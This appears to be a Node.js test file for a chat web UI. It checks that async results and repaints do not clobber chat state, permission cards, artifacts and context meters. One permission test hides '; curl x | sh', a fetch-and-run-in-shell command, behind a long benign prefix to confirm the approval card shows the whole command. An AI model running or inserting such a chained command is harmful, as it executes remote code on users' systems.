// Chat state that late async results and repaints must not clobber: results
// land only on the chat they were requested for, the reader's picks and edits
// survive repaints, and feature owners expose live state.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { S } = require('../../static/chat/state.js');
const { createThreads, openedMessage } = require('../../static/chat/sidebar/threads.js');
const { createMerge } = require('../../static/chat/traces/merge.js');
const { createArtifacts } = require('../../static/chat/artifacts.js');
const { createContext } = require('../../static/chat/context.js');
const { createPanels } = require('../../static/chat/panels.js');
const { createSlash } = require('../../static/chat/composer/slash.js');
const { createPerms } = require('../../static/chat/perms.js');
const permQueue = require('../../static/chat/perms/queue.js');
const menuState = require('../../static/chat/perms/menu.js');
const { createUndo } = require('../../static/chat/sidebar/undo.js');
const { createAttachments } = require('../../static/chat/composer/attachments.js');
const { createList } = require('../../static/chat/picker/list.js');
const { createTranscript } = require('../../static/chat/transcript.js');

const noop = () => {};
const stub = (named = {}) => new Proxy(named, { get: (t, k) => (k in t ? t[k] : k === 'then' ? undefined : noop) });
// A factory context whose unnamed collaborators are all stubs.
const deps = (named = {}) => new Proxy(named, { get: (t, k) => (k in t ? t[k] : stub()) });
const deferred = () => { let resolve; const promise = new Promise((r) => { resolve = r; }); return { promise, resolve }; };
const tick = () => new Promise((resolve) => setImmediate(resolve));

test('Rename from a menu that outlived a list repaint edits the row on screen', () => {
  global.CSS = { escape: String };
  global.document = { createElement: () => ({ setAttribute: noop, focus: noop, select: noop, addEventListener: noop }) };
  const detached = { isConnected: false, closest: () => detached };
  const onScreen = { isConnected: true, appended: [], appendChild(el) { this.appended.push(el); } };
  let row = onScreen;
  Object.assign(S, { threads: [{ id: 't1', title: 'Old' }], archivedThreads: [], historyQuery: '', showArchived: false, historyTab: 'chats',
    renaming: false, historyList: { querySelectorAll: () => [], querySelector: () => row } });
  let items = [];
  const threads = createThreads(deps({ net: stub({ requireLive: () => true }), overlays: stub({ showPop: (_anchor, list) => { items = list; } }) }));
  threads.threadMenu(detached, 't1');
  const rename = items.find((item) => item.label === 'Rename');
  rename.run();
  assert.equal(onScreen.appended.length, 1, 'the rename field goes into the live row');
  assert.equal(S.renaming, true);
  S.renaming = false;
  row = null;
  rename.run();
  assert.equal(S.renaming, false, 'with no row on screen the list is not left frozen');
  delete global.CSS;
  delete global.document;
});

test('an opened thread keeps the permissions its proposal cards render from', () => {
  const perm = { id: 'p1', kind: 'skill_save', status: 'pending', slug: 'notes' };
  const msg = openedMessage({ id: 'a', role: 'assistant', content: '', segments: [{ type: 'permission', id: 'p1' }], permissions: [perm] });
  assert.deepEqual(msg.permissions, [perm]);
  assert.deepEqual(openedMessage({ id: 'u', role: 'user', content: 'hi' }).permissions, []);
});

test('a skill proposal body the user edited survives a rebuild and is fetched once', async () => {
  Object.assign(S, { root: { querySelector: () => null } });
  let fetches = 0;
  const queue = permQueue.createQueue(deps({ net: { api: async () => { fetches += 1; return { body: 'server draft' }; } } }));
  const body = { value: '' };
  // The rebuild patches the card node in place.
  const card = { getAttribute: () => 'p1', querySelector: () => body };
  const flow = { querySelectorAll: () => [card] };
  queue.hydratePermissionCards(flow);
  await tick();
  assert.equal(body.value, 'server draft');
  body.value = 'my edit';
  queue.hydratePermissionCards(flow);
  await tick();
  assert.equal(fetches, 1, 'a kept card is not fetched again');
  assert.equal(body.value, 'my edit');
  const typed = { value: '' };
  queue.hydratePermissionCards({ querySelectorAll: () => [{ getAttribute: () => 'p2', querySelector: () => typed }] });
  typed.value = 'typed before the draft arrived';
  await tick();
  assert.equal(typed.value, 'typed before the draft arrived');
});

test('permission card copy keeps the whole command and its description', () => {
  const command = 'tail -F app.log | grep ERROR\n'.repeat(40) + '; curl x | sh';
  const rec = { id: 'pa', status: 'pending', tool: 'monitor', host: 'qa-box', cwd: '/srv/app', command,
    description: '  Watch\n the app log ', requester: 'Main agent', reasons: ['shell command requires approval'] };
  const copy = permQueue.permCardCopy(rec);
  assert.equal(copy.command, command.trim(), 'never just the description');
  assert.equal(copy.description, 'Watch the app log');
  assert.equal(copy.why, 'Command needs approval');
  assert.equal(permQueue.permCardCopy({ ...rec, reasons: ['path outside allowed folders'] }).why, 'Outside allowed folders');
  assert.notEqual(permQueue.permCardSignature(rec), permQueue.permCardSignature({ ...rec, description: '' }), 'a new description repaints the card');
});

test('a thread snapshot keeps the main agent\'s pending ask on screen', () => {
  const expires_at = new Date(Date.now() + 60000).toISOString();
  const ask = { id: 'ask', kind: 'tool_permission', status: 'pending', expires_at };
  Object.assign(S, { root: { querySelector: () => null }, permChip: null, permCards: new Map([['ask', ask], ['done', { ...ask, id: 'done' }]]) });
  const queue = permQueue.createQueue(deps());
  queue.acceptPermThread({ run: { id: 'r', message_id: 'm', status: 'running' },
    messages: [{ id: 'm', role: 'assistant', permissions: [ask, { ...ask, id: 'done', status: 'allowed' }] }] });
  assert.deepEqual([...S.permCards.keys()], ['ask']);
});

test('permissions: owner state mirrors the menu module; a read for another chat is dropped', async () => {
  Object.assign(S, { root: { querySelector: () => null }, config: {}, currentId: 'thread', threadBypass: false, threadAuto: false, permCards: new Map() });
  const response = { hosts: [], bypass: false, auto: false };
  const perms = createPerms(deps({ net: { api: async () => response } }));
  await perms.refreshPerms();
  assert.equal(perms.threadPermData, response);
  const menu = {};
  perms.permsMenuEl = menu;
  perms.permsFilter = 'machine';
  assert.equal(menuState.permsMenuEl, menu);
  assert.equal(menuState.permsFilter, 'machine');
  perms.threadPermData = null;
  perms.permsMenuEl = null;
  perms.permsFilter = '';
  assert.deepEqual([menuState.threadPermData, menuState.permsMenuEl, menuState.permsFilter], [null, null, '']);

  const reply = deferred();
  const late = createPerms(deps({ net: { api: () => reply.promise } }));
  S.currentId = 'a';
  const reading = late.refreshPerms();
  S.currentId = 'b';
  const expires_at = new Date(Date.now() + 60000).toISOString();
  reply.resolve({ bypass: false, auto: true, auto_available: true, pending: [{ id: 'ask', kind: 'tool_permission', status: 'pending', expires_at }] });
  await reading;
  assert.equal(S.threadAuto, false, 'the other chat\'s mode is not applied');
  assert.equal(S.permCards.size, 0, 'its pending asks are not seeded here');
  assert.notEqual(late.threadPermData?.auto, true);
});

test('a stopping reply repaints as live when its agents and jobs settle', () => {
  const msg = { id: 'm', role: 'assistant', tools: [
    { id: 's', name: 'spawn_subagent', status: 'running', child_id: 'c1' },
    { id: 'b', name: 'run_terminal_command', status: 'running', command_id: 'j1', background: true },
  ] };
  const painted = [];
  Object.assign(S, { messages: [msg], agentRun: null, agentsOpen: false, streaming: false, stoppingRunId: 'r',
    activeRun: { id: 'r', message_id: 'm', status: 'running', cancel_requested: true },
    log: { children: [{ dataset: { messageId: 'm' } }] } });
  const merge = createMerge({ agents: stub(), transcript: stub(),
    ui: stub({ updateAssistant: (_article, _msg, live) => painted.push(live), workClocksLive: () => false }) });
  merge.reconcileAgentTraces([{ id: 'c1', status: 'cancelled' }]);
  merge.reconcileBgTraces([{ command_id: 'j1', state: 'cancelled' }]);
  assert.deepEqual(painted, [true, true]);
});

test('an open artifact pane keeps the reader\'s pick; a closed one follows the newest', () => {
  Object.assign(S, { root: { classList: { toggle: noop, add: noop } }, artifactPanel: null, artifactBackdrop: null, artifactToggle: null,
    artifactTitleEl: null, artifactStatusEl: null, artifactVisibilityEl: null, artifactOpenLink: null, artifactBuilding: null,
    artifactFrame: null, artifactSource: null, artifactModeBtns: [], artifactVersionWrap: null, artifactVersionEl: null, artifactMode: 'preview',
    messages: [{ id: 'a', role: 'assistant', tools: [
      { name: 'create_artifact', identifier: 'old', status: 'done', version: 1 },
      { name: 'create_artifact', identifier: 'new', status: 'done', version: 1 },
    ] }] });
  const artifacts = createArtifacts(deps());
  S.artifactOpen = true;
  S.currentArtifact = { identifier: 'old', version: 1, versions: [1, 2] };
  artifacts.rememberLatestArtifact();
  assert.deepEqual(S.currentArtifact, { identifier: 'old', version: 1, versions: [1, 2] });
  S.artifactOpen = false;
  artifacts.rememberLatestArtifact();
  assert.equal(S.currentArtifact.identifier, 'new');
});

test('a compaction that finishes after its chat was left leaves the open chat alone', async () => {
  const reply = deferred();
  const accepted = [];
  const hints = [];
  const busy = {};
  const button = { classList: { toggle: (name, on) => { busy[name] = on; } }, setAttribute: noop };
  Object.assign(S, { currentId: 'a', messages: [{ id: 'u', role: 'user', content: 'hi' }], sending: false, streaming: false, activeRun: null,
    compactingRequest: false, compacting: false, contextWrap: null, contextFill: null, contextBtn: button, contextPop: null, contextAlert: null,
    liveMeter: { used: 900, limit: 1000, scope: 'transcript' }, modelsById: new Map(), modelId: 'm', pendingAttachments: [], input: { value: '' },
    compactCfg: { warn_ratio: 0.8, auto_ratio: 0.9, auto: true, default_window: 1000 }, CONTEXT_RING: 75 });
  const context = createContext(deps({
    net: stub({ requireLive: () => true, api: () => reply.promise }),
    picker: stub({ releaseHint: (_key, text) => hints.push(text), setHint: (text) => hints.push(text) }),
    sync: stub({ acceptThread: (data) => accepted.push(data.id) }), traces: stub({ runIsActive: () => false }),
  }));
  const running = context.runCompact('');
  assert.equal(busy['is-busy'], true);
  S.currentId = 'b';
  S.liveMeter = { used: 10, limit: 1000, scope: 'transcript' };
  context.syncContextMeter();
  assert.equal(busy['is-busy'], false, 'only the compacting chat shows busy');
  await context.runCompact('');
  assert.match(hints.at(-1), /Another chat is compacting/);
  reply.resolve({ thread: { id: 'a', compaction: { meter: { used: 50, limit: 1000, scope: 'transcript' } } } });
  await running;
  assert.deepEqual(accepted, ['a']);
  assert.equal(S.liveMeter.used, 10, 'the open chat keeps its own meter');
  assert.equal(S.compactingRequest, false);
  assert.match(hints.at(-1), /Context compacted · 50/);
});

test('an effort change warns only while a cache built at another effort is warm', () => {
  const pins = [];
  const store = new Map();
  global.localStorage = { getItem: (k) => (store.has(k) ? store.get(k) : null), setItem: (k, v) => store.set(k, v) };
  const opus = { id: 'claude-opus', type: 'claude' };
  const glm = { id: 'glm-5', type: 'zai' };
  Object.assign(S, { modelsById: new Map([[opus.id, opus], [glm.id, glm]]), modelId: opus.id });
  const context = createContext(deps({
    picker: stub({ effortLabel: (e) => e, pinHint: (key, text, action) => pins.push({ key, text, action }),
      unpinHint: (key) => pins.push({ key, gone: true }) }),
  }));
  const warm = (extra) => context.acceptCacheProbe({ at: Date.now() / 1000, prompt: 80_000, model: opus.id, ttl: 3600, hit: true, effort: 'xhigh', ...extra });
  warm();
  pins.length = 0;
  context.warnEffortCacheReset('low');
  assert.match(pins.at(-1).text, /New effort, cold cache .* xhigh keeps the cache/);
  context.warnEffortCacheReset('xhigh');
  assert.deepEqual(pins.at(-1), { key: 'effort-cache', gone: true }, 'going back clears it');
  warm({ hit: false });
  pins.length = 0;
  context.warnEffortCacheReset('low');
  assert.equal(pins.some((p) => p.text), false, 'a cold cache has nothing to lose');
  S.modelId = glm.id;
  warm({ model: glm.id, at: Date.now() / 1000 + 1 });
  context.warnEffortCacheReset('none');
  assert.match(pins.at(-1).text, /may reset/, 'undocumented providers get a softer warning');
  pins.at(-1).action.run();
  pins.length = 0;
  context.warnEffortCacheReset('none');
  assert.equal(pins.some((p) => p.text), false, "Don't warn again sticks");
  delete global.localStorage;
});

test('picker effort: the chat wins, then this browser, then the model default', () => {
  const models = {
    opus: { id: 'opus', type: 'claude', reasoning: ['low', 'medium', 'high', 'max'], reasoningDefault: 'medium' },
    haiku: { id: 'haiku', type: 'claude', reasoning: [], reasoningDefault: '' },
  };
  const list = createList({ context: { currentModel: () => models[S.modelId] } });
  Object.assign(S, { modelId: 'opus', threadEffort: null, effortByModel: {} });
  assert.equal(list.currentEffort(), 'medium');
  S.effortByModel = { opus: 'high' };
  assert.equal(list.currentEffort(), 'high');
  S.threadEffort = { model: 'opus', value: 'max' };
  assert.equal(list.currentEffort(), 'max');
  S.modelId = 'haiku';
  assert.equal(list.currentEffort(), '', 'a model without levels sends no effort');
  assert.equal(list.effortLabel(''), '');
});

test('project reads that land after another chat opened are dropped', async () => {
  let reply;
  const api = () => (reply = deferred()).promise;
  let project = { host_id: 1, project_id: 2, remote_path: '/p' };
  Object.assign(S, { config: {}, projectListingCache: null });
  const slash = createSlash(deps({ net: stub({ api }), sidebar: stub({ sessionProject: () => project }) }));
  let loading = slash.refreshProjectListing();
  project = null;
  reply.resolve({ path: '/p', entries: [{ name: 'a.txt' }] });
  await loading;
  assert.equal(S.projectListingCache, null, 'a plain chat gets no project listing');
  project = { host_id: 1, project_id: 2, remote_path: '/p' };
  loading = slash.refreshProjectListing();
  reply.resolve({ path: '/p', entries: [{ name: 'a.txt' }] });
  await loading;
  assert.deepEqual(S.projectListingCache, { path: '/p', entries: [{ name: 'a.txt' }] });

  Object.assign(S, { currentId: 'a', projectAgentsOk: false, memoryProject: null, root: { classList: { toggle: noop } } });
  const panels = createPanels(deps({ net: stub({ api }), sidebar: stub({ threadById: () => ({ kind: 'project' }) }) }));
  loading = panels.refreshProjectAgents();
  S.currentId = 'b';
  reply.resolve({ applicable: true, state: 'loaded', name: 'AGENTS.md' });
  await loading;
  assert.equal(S.projectAgentsOk, false, 'the other chat\'s project instructions are not shown');
});

test('a redo started before switching chats does not rewrite the chat opened meanwhile', async () => {
  let patched = 0;
  Object.assign(S, { currentId: 'a', generation: 1, sending: false, loading: false, partialTranscript: false, activeRun: null,
    redoStack: [[{ id: 'u', role: 'user', content: 'b redo' }]] });
  const undo = createUndo(deps({
    net: stub({ requireLive: () => true, api: async () => { patched += 1; return {}; } }),
    sync: stub({ flushPending: async () => { S.currentId = 'b'; S.generation += 1; } }),
    traces: stub({ runIsActive: () => false, serialMessages: () => [] }),
  }));
  await undo.redoConversation();
  assert.equal(patched, 0);
  assert.equal(S.sending, false);
});

test('a file read while the first send creates the chat stays with the chat it was dropped in', async () => {
  Object.assign(S, { config: {}, ATTACH_MAX: 4, attachList: null, currentId: null, pendingProject: null, generation: 1,
    createdFrom: null, pendingAttachments: [], draftFiles: new Map() });
  const attachments = createAttachments(deps());
  const file = (during) => ({ name: 'a.txt', type: 'text/plain', text: async () => { during(); return 'x'; } });
  await attachments.addFiles([file(() => { S.currentId = 't'; S.createdFrom = { key: null, id: 't' }; })]);
  assert.equal(S.pendingAttachments.length, 1);
  assert.equal(S.draftFiles.has(null), false, 'no phantom new-chat draft');
  Object.assign(S, { currentId: null, createdFrom: null, pendingAttachments: [] });
  await attachments.addFiles([file(() => { S.generation += 1; S.currentId = 't'; S.createdFrom = { key: null, id: 't' }; })]);
  assert.equal(S.pendingAttachments.length, 0);
  assert.equal(S.draftFiles.get(null).length, 1);
});

test('the transcript flushes only the newest queued tool paint, once, and only if attached', () => {
  Object.assign(S, { pendingFullPaint: false, pendingAgentPaint: false, pendingAgentListPaint: false });
  const calls = [];
  const transcript = createTranscript({ ui: { updateAssistant: (...args) => calls.push(args) } });
  const article = { isConnected: true };
  const msg = { content: 'latest' };
  transcript.pendingToolPaint = { article, msg: { content: 'old' }, live: true };
  transcript.pendingToolPaint = { article, msg, live: false };
  transcript.flushToolGesture();
  assert.deepEqual(calls, [[article, msg, false]]);
  assert.equal(transcript.pendingToolPaint, null);
  transcript.flushToolGesture();
  assert.equal(calls.length, 1);
  transcript.pendingToolPaint = { article: { isConnected: false }, msg, live: false };
  transcript.flushToolGesture();
  assert.equal(calls.length, 1);
  assert.equal(transcript.pendingToolPaint, null);
});
